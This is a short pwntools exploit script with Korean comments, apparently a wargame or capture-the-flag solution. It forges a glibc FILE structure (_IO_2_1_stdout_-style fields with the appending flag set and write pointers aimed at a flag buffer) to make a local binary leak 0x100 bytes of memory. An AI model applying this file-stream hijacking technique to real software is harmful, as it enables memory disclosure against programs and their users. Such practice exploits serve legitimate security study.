
from pwn import *
p = process("./file_ar3")

print p.recvuntil("PTR: ")

fp = int(p.recvuntil("\n").strip("\n"),16)

print hex(fp)

print p.sendlineafter("Addr: ", str(fp))

# _IO_SYSWRUTE 함수를 호출하기 위해 _flag를 IO_IS_APPENDING 값인 0x800 과 or 연산한 값으로 조작
payload = p64(0xfbad2484 | 0x800)

payload += p64(0) # _IO_read_ptr
# _IO_read_end, _IO_write_base 를 동일한 값으로 조작하였다.
payload += p64(0x6010c0) # _IO_read_end
payload += p64(0) # _IO_read_base

# _IO_write_base 를 축력할 버퍼의 시작 주소인 flag_buf 주소로 조작
payload += p64(0x6010c0) # _IO_write_base
# IO_write_ptr 을 flag_buf + 0x100 으로 조작한다. 
payload += p64(0x6011c0) # _IO_write_ptr 

# 라이브러리 내부에서 _IO_SYSWRITE 함수가 호출되면 flag_buf 주소로부터 0x100 바이트만큼의 메모리가 출력

payload += p64(0) # _IO_write_end 
payload += p64(0) # _IO_buf_base
payload += p64(0) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0) 
payload += p64(1) # stdout

print p.sendlineafter("Value: ", str(payload))
p.interactive()